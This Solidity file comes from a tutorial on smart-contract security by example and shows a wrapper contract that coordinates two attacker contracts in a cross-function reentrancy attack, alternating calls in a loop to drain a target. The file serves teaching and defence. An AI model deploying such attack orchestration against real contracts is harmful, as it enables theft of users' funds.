// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-04-cross-function-reentrancy-de9cbce0558e
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-04-cross-function-reentrancy/

import "hardhat/console.sol";

pragma solidity ^0.8.13;

interface IAttackCorssFunc {
    function attackInit() external payable;
    function attackNext() external;
    function getBalance() external view returns (uint256);
}


contract AttackWrapper {
    IAttackCorssFunc public attack1;
    IAttackCorssFunc public attack2;

    constructor(IAttackCorssFunc a1, IAttackCorssFunc a2) {
        attack1 = a1;
        attack2 = a2;
    }

    function attack(uint256 times) external payable {
        attack1.attackInit{value:msg.value}();
        for(uint256 i=0;i<times;i++){
            attack2.attackNext();
            attack1.attackNext();
        }

    }


    function getBalance() external view returns (uint256 bal1,uint256 bal2) {
        bal1 =attack1.getBalance();
        bal2 =attack2.getBalance();
    }
}
